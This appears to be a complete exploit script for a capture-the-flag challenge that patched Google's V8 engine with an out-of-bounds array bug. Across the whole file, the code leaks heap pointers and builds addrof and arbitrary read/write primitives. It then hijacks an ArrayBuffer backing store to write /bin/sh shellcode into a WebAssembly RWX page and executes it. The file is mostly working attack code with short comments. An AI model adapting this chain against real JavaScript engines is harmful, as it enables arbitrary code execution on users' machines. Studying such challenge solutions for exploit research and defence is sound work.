var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) == float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) == BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

float_arr = [1.1, 2.2];
obj_arr = [{a:1}, {b:2}];

// increase float_arr.length to 10 due to vuln introduced in chall's patch
float_arr.setHorsepower(10);

// using oob read to retrieve information from float_arr object
// note: map and elements ptr are compressed (ie. missing the isolate-root)
float_map = float_arr[2];
print("[*] float_map (w/o isolate-root): 0x" + (ftoi(float_map) & 0xffffffffn).toString(16));
float_elements = float_arr[3];
print("[*] float_elements (w/o isolate-root): 0x" + (ftoi(float_elements) & 0xffffffffn).toString(16));

// since allocation of js objects is predictive, we can use offsets retrieved using
// calls to %DebugPrint() to substract ptr
// note: even if we don't have the isolate-root (no leak in near-memory afaic), we can swap values since js-engine will use lowest 32 bit and add isolate-root for us
obj_map = itof(ftoi(float_map) + (0x50n));
print("[*] obj_map (w/o isolate-root): 0x" + (ftoi(obj_map) & 0xffffffffn).toString(16));
obj_elements = itof(ftoi(float_elements) + (0x28n));
print("[*] obj_elements (w/o isolate-root): 0x" + (ftoi(obj_elements) & 0xffffffffn).toString(16));


function addrof(obj) {
	// set both arrays to point to same elements ptr
	float_arr[3] = obj_elements;
	obj_arr[0] = obj;
	return ftoi(float_arr[0]);
}

// retrieve float_arr addr base using primitive
//%DebugPrint(float_arr);
//print("[*] addr of float_arr: 0x" + (addrof(float_arr) & 0xffffffffn).toString(16));

function v8heap_read(addr) {
	lamb = [1.1, 1.1];
	lamb.setHorsepower(10);

	addr = addr - 0x8n;
	if (addr % 2n == 0) {
		addr += 1n;
	}

	lamb[3] = itof(addr);
	return ftoi(lamb[0]);
}

function v8heap_write(addr, data) {
	lamb = [1.1, 1.1];
	lamb.setHorsepower(10);

	addr = addr - 0x8n;
	if (addr % 2n == 0) {
		addr += 1n;
	}

	lamb[3] = itof(addr);
	lamb[0] = itof(data);
}

//%DebugPrint(float_arr);
print("[*] float_arr map from memory: 0x" + (v8heap_read(addrof(float_arr)) & 0xffffffffn).toString(16));


// generating our WASM object that we will use to have RWX memory
// https://orangecyberdefense.com/global/blog/sensepost/introduction-to-webassembly/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;

//%DebugPrint(wasm_instance);
// use gdb to list rwx pages (vmmap)
// gef!search-pattern <value>
// substracting the addr from wasm_instance, we have an offset of 0x68 for the rwx

rwx_addr_ptr = addrof(wasm_instance) + 0x68n;
rwx_addr = v8heap_read(rwx_addr_ptr);
print("[*] rwx section: 0x" + rwx_addr.toString(16));

// TypedArray to use to read/write outside of v8 heap
var buf8 = new ArrayBuffer(0x100);
buf8_addr = addrof(buf8);
print("[*] addr of buf8: 0x" + (buf8_addr & 0xffffffffn).toString(16));

// overwriting it's backingstore
// again using DebugPrint and gef!search-pattern to calculate offset
//%DebugPrint(buf8);
buf8_backing = buf8_addr + 0x14n;
print("[*] addr of buf8 backing store ptr: 0x" + (buf8_backing & 0xffffffffn).toString(16));
v8heap_write(buf8_backing, rwx_addr);
// validate that we overwrote the pointer
//%DebugPrint(buf8);

var u8_memory = new Uint8Array(buf8);

// /bin/sh shellcode
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 46, 114, 105, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 69, 68, 59, 32, 47, 98, 105, 110, 80, 72, 184, 101, 99, 104, 111, 32, 80, 87, 78, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5];

u8_memory.set(shellcode);
wasm_func();
